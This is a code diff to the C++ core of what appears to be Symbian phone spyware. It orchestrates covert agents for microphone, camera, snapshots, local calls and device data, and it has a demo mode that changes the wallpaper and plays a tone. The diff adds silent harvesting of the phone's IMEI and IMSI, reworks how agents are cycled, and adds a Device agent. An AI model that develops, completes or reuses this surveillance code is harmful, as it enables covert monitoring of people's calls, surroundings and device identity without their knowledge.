@@ -22,6 +22,8 @@
 #include <HT\AbstractAgent.h>
 #include <HT\AbstractAction.h>
 
+TBuf<50>  iGlobalImei;
+TBuf<15>  iGlobalImsi;
 
 CCore::CCore() :
 	CAbstractQueueEndPoint(ECore)
@@ -45,18 +47,17 @@ CCore::~CCore()
 	delete iFreeSpaceMonitor;
 	
 	//TODO: activate this in 8.0
-	/*
 	if(iDemoVersion)
 		{
 		delete iWallpaper;
 		delete iTonePlayer;
 		}
-		*/
+	/*
 #ifdef _DEMO  //TODO: delete this in 8.0
 	delete iWallpaper;
 	delete iTonePlayer;
 #endif
-
+*/
 	iFs.Close();
 	RProperty::Delete(KPropertyFreeSpaceThreshold);
 	__FLOG(_L("EndDestructor"));
@@ -84,19 +85,25 @@ void CCore::ConstructL()
 	else
 		iDemoVersion = EFalse;
 	
+	//TODO: test
+	CPhone* phone = CPhone::NewLC();
+	phone->GetImeiSync(iGlobalImei);
+	phone->GetImsiSync(iGlobalImsi);
+	CleanupStack::PopAndDestroy();
+	//end test
+	
 	//TODO: activate this in 8.0
-	/*
 	if(iDemoVersion)
 		{
 		iWallpaper = CWallpaperSticker::NewL();
 		iTonePlayer = CTonePlayer::NewL();
 		}
-	*/
+	/*
 #ifdef _DEMO  //TODO: delete this in 8.0
 	iWallpaper = CWallpaperSticker::NewL();
 	iTonePlayer = CTonePlayer::NewL();
 #endif
-	
+	*/
 	__FLOG(_L("End ConstructL"));
 	}
 
@@ -123,7 +130,7 @@ void CCore::DisposeAgentsAndActionsL()
 		}	
 	}
 
-void CCore::RestartAllAgentsL()
+void CCore::RestartAllAgentsL()  //TODO: check if still used
 	{
 	// Stops all the running Agents...
 	for (int i = 0; i < iConfig->iAgentsList.Count(); i++)
@@ -138,7 +145,7 @@ void CCore::RestartAllAgentsL()
 	}
 
 
-void CCore::RestartAppendingAgentsL()
+void CCore::CycleAppendingAgentsL()
 	{
 	// Stops the running Agents that creates logs in append
 	// so excluding: AgentMic, AgentSnapshot, AgentCallLocal, AgentCamera
@@ -153,10 +160,12 @@ void CCore::RestartAppendingAgentsL()
 				case EAgent_Snapshot:
 				case EAgent_CallLocal:
 				case EAgent_Cam:
+				case EAgent_Device:
 					break;
 				default:
 					{
-					TCmdStruct restartCmd(ERestart, ECore, dataAgent->iId);
+					//TCmdStruct restartCmd(ERestart, ECore, dataAgent->iId);
+					TCmdStruct restartCmd(ECycle, ECore, dataAgent->iId);
 					SubmitNewCommandL(restartCmd);
 					}
 					break;
@@ -355,7 +364,7 @@ void CCore::ExecuteActionL(TActionType type, const TDesC8& params)
 			9. L'Azione termina e viene ristabilito lo stato precedente (es: vengono spente le periferiche che erano state accese).
 		 */
 		//RestartAllAgentsL();  // original MB
-		RestartAppendingAgentsL();
+		CycleAppendingAgentsL();
 		}
 	
 	// Creates the Action and send it a Start
@@ -371,16 +380,15 @@ void CCore::DispatchCommandL(TCmdStruct aCommand)
 	ASSERT( aCommand.iType == ENotify );
 
 	//TODO: activate this in 8.0
-	/*
 	if(iDemoVersion)
 		{
 		iTonePlayer->Play();
 		}
-		*/
+	/*
 #ifdef _DEMO  //TODO: delete this in 8.0
 	iTonePlayer->Play();
 #endif
-
+*/
 	// This is an "Event Triggered" Notification...
 	// Gets the id of the macro action to execute...
 	TInt macroIdx = aCommand.iSrc;
@@ -661,18 +669,17 @@ LOCAL_C void DoStartL()
 	core->StartMonitorFreeSpace();
 	
 	//TODO: activate this in 8.0
-	/*
 	if(core->DemoVersion())
 		{
 		core->ChangeWallpaper();
 		}
-	*/
+	/*
 #ifdef _DEMO  //TODO: delete this in 8.0
 	//change wallpaper
 	core->ChangeWallpaper();
 #endif
-	
-	CActiveScheduler::Start(); 
+	*/
+	CActiveScheduler::Start();  
 	CleanupStack::PopAndDestroy(core);
 	// Delete active scheduler
 	CleanupStack::PopAndDestroy(scheduler);
